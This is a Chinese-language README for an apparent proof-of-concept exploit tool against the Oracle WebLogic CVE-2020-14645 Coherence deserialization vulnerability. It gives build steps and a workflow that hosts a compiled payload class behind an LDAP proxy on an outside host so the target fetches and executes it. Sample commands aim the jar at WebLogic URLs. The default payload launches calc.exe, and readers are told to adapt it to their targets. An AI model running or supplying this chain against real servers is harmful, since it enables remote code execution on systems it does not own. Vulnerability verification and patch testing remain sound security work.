# Weblogic CVE-2020-14645 coherence 反序列化漏洞验证程序

## 环境

- Maven 3

- JDK 1.8

## 编译

```
mvn package
```

## 使用

具体的测试步骤：

1. 编写 POC
2. 将 POC 编译为 class 文件
3. 启动一个静态站点用于发布编译的 POC
4. 启动一个LDAP代理用于转发测试目标拉取 POC 的请求
5. 测试程序执行

由于此漏洞与 [Apache Dubbo](https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki) 这个漏洞类似，请参加这个漏洞来实现 `1-4` 这几个步骤。

### 测试程序执行

```
java -jar target/CVE-2020-14645.jar LDAP_IP:LDAP_PORT/#CLASS_NAME WEBLOGIC_URL

# 示例
java -jar target/CVE-2020-14645.jar 1.1.1.1:8080/#exp http://127.0.0.1:7001
java -jar target/CVE-2020-14645.jar 1.1.1.1:8080/#exp https://127.0.0.1:7002
```

如果使用本例提供的 POC，利用成功后被测目标会执行 `calc.exe`。请自行根据测试目标环境来修改 POC。

## 鸣谢

本项目参考和引用了项目 [@Y4er](https://github.com/Y4er) [@5up3rc](https://github.com/5up3rc) 的部分代码，特此感谢！

# 参考资料

https://github.com/Y4er/CVE-2020-14645

https://github.com/5up3rc/weblogic_cmd

